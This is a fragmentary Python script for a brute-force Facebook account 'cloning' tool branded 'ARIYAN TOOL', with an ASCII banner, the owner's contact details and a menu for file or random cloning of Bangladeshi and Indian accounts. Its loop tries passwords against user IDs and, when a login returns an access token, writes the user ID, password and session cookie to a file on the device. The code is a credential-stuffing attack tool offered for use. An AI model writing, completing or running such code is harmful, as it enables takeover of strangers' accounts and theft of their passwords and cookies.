...
print('\n\033[0;97m[+]\033[1;32m WELLCOME TO ARIYAN TOOL ...')
os.system('espeak -a 300 " Wellcome,   To,  ,ariyan ,Tool,"')
try:
...
try:
	os.makedirs('/sdcard/ARIYAN')
except:
		pass
sys.stdout.write('\x1b]2;ARIYAN-XD\x07')
#<<_________[ LOGO ]_________>>#
logo = (f"""
  {W}      db       MMM.MMq. '7MMF'`YMM'    `MM'  db      `7MN.   `7MF'     
  {G}     ;MM:      MM   `MM.  MM    VMA   ,V    ;MM:       MMN.    M      
  {R}     V^MM      MM   ,M9   MM     VMA ,V    ,V^MM.      M YMb   M     
  {W}   ,M  `MM     MMmmdM9    MM      VMMP    ,M  `MM      M  `MN. M    
  {G}   AbmmmqMA    MM YM.     MM       MM     AbmmmqMA     M   `MM.M    
  {R}  A'     VML   MM  `Mb.   MM       MM    A'     VML    M     YMM   
  {W}.AMA.   .AMMA..MM.   JMM.JMM.    .JMML..AMA.   .AMMA..JML.    YM    
  
{G} [{G}+{G}]{G}<{G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}>++<{G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}>{G}
 \033[1;32m[\033[1;32m+\033[1;32m] \033[1;32mOWNER    : ARIYAN CHOWDHURY
 \033[1;32m[\033[1;32m+\033[1;32m] \033[1;32mFB ID    : ARIYAN CHOWDHURY
 \033[1;32m[\033[1;32m+\033[1;32m] \033[1;32mWHATS APP: 01758011315
 \033[1;32m[\033[1;32m+\033[1;32m] \033[1;32mSTATUS   : PERSONAL
 \033[1;32m[\033[1;32m+\033[1;32m] \033[1;32mVERSION  : 0.1
{G} [{G}+{G}]{G}<{G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}>++<{G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}>{G}
{G} [{G}+{G}]         [WELLCOME TO \033[1;322m\033[1;32mARIYAN TOOL]
{G} [{G}+{G}]{G}<{G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}>++<{G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}={G}>{G}""")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{A}──────────────────────────────────────────────────')
        print(f'{G}[{A}={G}]{G} THE PROCESS HAS BEEN COMPLETE...')
        print(f'{G}[{A}={G}]{G} TOTAL OK {A}:{G} %s' % str(len(oks)))
        print(f'{G}[{A}={G}]{G} TOTAL CP {A}:{G} %s' % str(len(cps)))
        print(f'\r{A}──────────────────────────────────────────────────')
        input(f"{G}[{A}={G}]{G} PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
    print(f'{G1}[{A}2{G}]{G} RANDOM CLONING')
    print(f'{G1}[{A}3{G}]{G} CONTACT TOOL OWNER')
...
def _randm_():   
    ...
    print(f'{G1}[{A}2{G}]{G} INDIA CLONING')
    print(f'{G1}[{A}0{G}]{G} BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G}]{G} CHOICE {A}:{G5} ')
    if select =='1':
        _bd_()
    elif select =='2':
        _India_()
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                open('/sdcard/ARIYAN-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
